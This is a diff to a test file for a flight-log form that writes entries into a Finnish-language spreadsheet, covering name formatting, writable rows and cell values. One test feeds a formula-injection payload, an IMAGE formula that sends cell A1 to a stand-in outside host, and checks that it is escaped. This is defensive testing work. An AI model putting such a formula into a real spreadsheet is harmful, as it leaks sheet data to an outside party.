@@ -34,10 +34,10 @@ describe("form input", () => {
     expect(minutesBetween("14:05", "")).toBeNull();
   });
 
-  test("sheet names in the T.Kuutti style", () => {
-    expect(sheetNameFor("Tero Kuutti")).toBe("T.Kuutti");
+  test("sheet names in the M.Meikäläinen style", () => {
+    expect(sheetNameFor("Matti Meikäläinen")).toBe("M.Meikäläinen");
     expect(sheetNameFor("Anna Maria Laine")).toBe("A.Laine");
-    expect(sheetNameFor("Bodis")).toBe("Bodis");
+    expect(sheetNameFor("Kalle")).toBe("Kalle");
   });
 });
 
@@ -54,7 +54,7 @@ describe("writing to the sheet", () => {
 
   test("a row someone has started typing into is not used", () => {
     const halfTyped = formulaRow();
-    halfTyped[1] = "T.Kuutti";
+    halfTyped[1] = "M.Meikäläinen";
     const values = sheet(flight("a"), formulaRow(), halfTyped, formulaRow());
     const parsed = parseFlightSheet(values);
     expect(findWritableRows(values, parsed, formulas(4))).toEqual([4]);
@@ -70,10 +70,10 @@ describe("writing to the sheet", () => {
     const parsed = parseFlightSheet(sheet(flight("a")));
     const cells = flightCells(
       {
-        id: "new", flightDate: "2026-04-01", picName: "T.Kuutti", secondName: null,
+        id: "new", flightDate: "2026-04-01", picName: "M.Meikäläinen", secondName: null,
         personsOnBoard: 2, departure: "EFSA", arrival: "EFJO", takeoff: "09:30",
         landing: "10:08", landings: 1, purposeCode: "MAT", fuelLitres: 60.5,
-        oilLitres: null, hourMeter: null, remarks: null,
+        oilQuarts: null, hourMeter: null, remarks: null,
       },
       7,
       parsed.columns
@@ -81,12 +81,15 @@ describe("writing to the sheet", () => {
     const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
     expect(byHeader).toMatchObject({
       "Päivämäärä": "2026-04-01",
-      "Lentoonlähtöaika": "09:30",
+      // Times as fractions of a day: as text, a Finnish-locale sheet keeps
+      // "09:30" as text and the airborne-time formula shows #VALUE!
+      "Lentoonlähtöaika": 570 / 1440,
+      "Laskuaika": 608 / 1440,
       // Numbers as numbers: as text, a Finnish-locale sheet reads "1.5" as a date
       "Tankkaus": 60.5,
       "Henkilömäärä": 2,
       "Öljy": "",
-      "Päällikkö": "'T.Kuutti",
+      "Päällikkö": "'M.Meikäläinen",
       "Oppilas / SIC": "",
       ID: "'new",
       "Lähde": "'web",
@@ -102,17 +105,17 @@ describe("writing to the sheet", () => {
     const parsed = parseFlightSheet(sheet(flight("a")));
     const cells = flightCells(
       {
-        id: "new", flightDate: "2026-04-01", picName: "=T.Kuutti", secondName: "+1",
+        id: "new", flightDate: "2026-04-01", picName: "=M.Meikäläinen", secondName: "+1",
         personsOnBoard: 1, departure: "EFSA", arrival: "EFSA", takeoff: "09:30",
         landing: "10:08", landings: 1, purposeCode: "HAR", fuelLitres: null,
-        oilLitres: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
+        oilQuarts: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
       },
       7,
       parsed.columns
     );
     const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
     expect(byHeader["Huomiot"]).toBe(`'=IMAGE("https://example.invalid/"&A1)`);
-    expect(byHeader["Päällikkö"]).toBe("'=T.Kuutti");
+    expect(byHeader["Päällikkö"]).toBe("'=M.Meikäläinen");
     expect(byHeader["Oppilas / SIC"]).toBe("'+1");
   });
 
